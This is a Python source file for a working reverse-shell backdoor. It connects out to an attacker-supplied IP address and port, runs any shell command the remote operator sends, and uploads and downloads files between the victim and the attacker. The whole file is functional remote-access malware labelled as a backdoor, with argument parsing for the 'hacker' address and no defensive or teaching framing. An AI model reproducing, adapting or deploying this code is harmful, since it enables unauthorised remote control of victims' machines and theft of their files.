from socket import *
import subprocess
import argparse
from termcolor import cprint
import os

class Backdoor:
    def __init__(self, address, port):
        self.sd = socket(AF_INET, SOCK_STREAM)
        self.sd.connect((address, port))

    def execute_sys_cmd(self, command):
        return subprocess.check_output(command, shell=True)

    def change_dir(self, path):
        try:
            os.chdir(path)
            return f'Changing directory to {path}'
        except:
            return f"Directory doesn't exist"

    def send_file(self, path):
        if os.path.exists(path) and os.path.isfile(path):
            with open(path, 'rb') as f:
                f_bytes = f.read()
                return f'{len(f_bytes)}\r\n'.encode()+f_bytes
        else:
            return b'0\r\n'
        
    def receive_file(self, size, name):
        file_bytes = self.sd.recv(size)
        
        with open(name, 'wb') as f:
            f.write(file_bytes)

    def read_until_CRLF(self):
        size = ''
        
        while True:
            size += self.sd.recv(1).decode('utf-8','ignore')

            if size.endswith('\r\n'):
                break

        return size[:-2]

    def run(self):
        while True:
            try:
                command = self.read_until_CRLF()
                cmd_list = command.split(' ')

                if cmd_list[0]=='exit':
                    self.sd.send(b'17\r\nCLOSED CONNECTION')
                    self.sd.close()
                    exit()
                
                elif cmd_list[0]=='cd' and len(cmd_list)>1:
                    result = self.change_dir(cmd_list[1])
                    self.sd.send(f'{len(result)}\r\n{os.getcwd()}\r\n{result}'.encode())
                
                elif cmd_list[0]=='down' and len(cmd_list)>1:
                    result = self.send_file(cmd_list[1])
                    self.sd.send(result)

                elif cmd_list[0]=='up' and len(cmd_list)>1:
                    size = self.read_until_CRLF()
                    self.receive_file(int(size), cmd_list[1])

                else:
                    result = self.execute_sys_cmd(command).decode()
                    self.sd.send(f'{len(result)}\r\n{result}'.encode())
            
            except subprocess.CalledProcessError:
                self.sd.send(b'10\r\nNO COMMAND')

'''
Error raised if the user doesn't specify a valid target IP address
'''
class NoAddressSpecified(Exception):
    pass


'''
Error raised if the user doesn't specify a valid gateway IP address
'''
class NoPortSpecified(Exception):
    pass


'''
Evaluate if IP_address is valid
'''
def check_format_IP(IP_address):
    #Split the IP address in the fields separated by '.'
    IP_numbers = IP_address.split('.')
    
    #Error in the format if the number of fields is != 4 
    if len(IP_numbers)!=4:
        raise NoAddressSpecified
    else:
        #Check if each field has valid value (>=0 and <256)
        for num in IP_numbers:
            if(int(num)>255 or int(num)<0):
                raise NoAddressSpecified

    return IP_address

'''
Parser of command line arguments
'''
def args_parser():
    #Parser of command line arguments
    parser = argparse.ArgumentParser()
    #Initialization of needed arguments
    parser.add_argument("-address", "-a", dest="address", help="IP address of the hacker")
    parser.add_argument("-port", "-p", dest="port", help="Port number of the hacker")
    #Parse command line arguments
    args = parser.parse_args()
    
    #Check if the arguments have been specified on command line
    try:
        if not args.address:
            raise NoAddressSpecified
        
        if not args.port:
            raise NoPortSpecified
        
        address=check_format_IP(args.address)
        cprint('\nAddress:   ', 'yellow', attrs=['bold',], end='')
        print(f'{address}')
        cprint('Port:  ', 'green', attrs=['bold',], end='')
        print(f'{args.port}', end='\n\n')

    except (NoAddressSpecified, NoPortSpecified) as e :
        parser.print_help()
        exit(0)

    return address, int(args.port)


if __name__=='__main__':
    address, port = args_parser()
    client = Backdoor(address, port)
    client.run()
